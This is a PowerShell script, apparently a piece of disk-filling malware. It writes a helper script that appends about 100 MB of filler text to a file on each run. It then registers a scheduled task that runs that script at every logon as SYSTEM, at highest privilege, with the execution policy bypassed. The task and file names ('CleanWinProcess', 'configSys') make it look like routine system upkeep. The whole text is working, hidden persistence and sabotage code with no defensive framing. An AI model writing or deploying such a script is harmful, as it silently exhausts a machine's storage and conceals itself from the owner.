mkdir "C:\configWin" | out-null
mkdir "C:\configWin\assets" | out-null

$contenuto = @'
$a = "a" * 104857600 | Out-File -FilePath "C:\configWin\assets\configwind.txt" -Append
'@

$contenuto | Out-File "C:\configWin\assets\configSys.ps1"

$scriptPath = "C:\configWin\assets\configSys.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal
